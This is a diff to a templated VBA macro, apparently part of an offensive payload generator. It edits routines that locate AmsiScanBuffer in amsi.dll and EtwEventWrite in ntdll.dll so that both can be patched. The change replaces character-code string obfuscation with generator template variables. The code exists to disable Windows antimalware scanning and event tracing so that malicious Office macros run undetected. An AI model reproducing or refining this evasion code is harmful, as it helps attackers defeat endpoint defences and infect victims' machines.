@@ -29,17 +29,8 @@ End Function
 
 Private Sub {{ v.fn_amsi_patch }}()
     On Error Resume Next
-    Dim amsiCodes(5) As Integer
-    amsiCodes(0)=97:amsiCodes(1)=109:amsiCodes(2)=115:amsiCodes(3)=105
-    amsiCodes(4)=46:amsiCodes(5)=100  ' "amsi.d"
-    Dim amsiCodes2(1) As Integer: amsiCodes2(0)=108:amsiCodes2(1)=108  ' "ll"
-    Dim amsiLib As String: amsiLib = {{ v.fn_build_str }}(amsiCodes) & {{ v.fn_build_str }}(amsiCodes2)
-    Dim fnCodes(14) As Integer
-    fnCodes(0)=65:fnCodes(1)=109:fnCodes(2)=115:fnCodes(3)=105
-    fnCodes(4)=83:fnCodes(5)=99:fnCodes(6)=97:fnCodes(7)=110
-    fnCodes(8)=66:fnCodes(9)=117:fnCodes(10)=102:fnCodes(11)=102
-    fnCodes(12)=101:fnCodes(13)=114  ' "AmsiScanBuffer" (14 chars, 0-13)
-    Dim scanName As String: scanName = {{ v.fn_build_str }}(fnCodes)
+    Dim amsiLib As String: amsiLib = {{ v.vba_amsi_dll }}
+    Dim scanName As String: scanName = {{ v.vba_amsi_scan_buf }}
     Dim amsiBase As LongPtr: amsiBase = LoadLibraryA(amsiLib)
     If amsiBase = 0 Then Exit Sub
     Dim scanAddr As LongPtr: scanAddr = GetProcAddress(amsiBase, scanName)
@@ -54,15 +45,8 @@ End Sub
 
 Private Sub {{ v.fn_etw_patch }}()
     On Error Resume Next
-    Dim ntdllCodes(8) As Integer
-    ntdllCodes(0)=110:ntdllCodes(1)=116:ntdllCodes(2)=100:ntdllCodes(3)=108
-    ntdllCodes(4)=108:ntdllCodes(5)=46:ntdllCodes(6)=100:ntdllCodes(7)=108:ntdllCodes(8)=108
-    Dim ntdllName As String: ntdllName = {{ v.fn_build_str }}(ntdllCodes)
-    Dim etwCodes(12) As Integer
-    etwCodes(0)=69:etwCodes(1)=116:etwCodes(2)=119:etwCodes(3)=69
-    etwCodes(4)=118:etwCodes(5)=101:etwCodes(6)=110:etwCodes(7)=116
-    etwCodes(8)=87:etwCodes(9)=114:etwCodes(10)=105:etwCodes(11)=116:etwCodes(12)=101
-    Dim etwName As String: etwName = {{ v.fn_build_str }}(etwCodes)
+    Dim ntdllName As String: ntdllName = {{ v.vba_ntdll_dll }}
+    Dim etwName As String: etwName = {{ v.vba_etw_event_write }}
     Dim ntdllBase As LongPtr: ntdllBase = LoadLibraryA(ntdllName)
     If ntdllBase = 0 Then Exit Sub
     Dim etwAddr As LongPtr: etwAddr = GetProcAddress(ntdllBase, etwName)
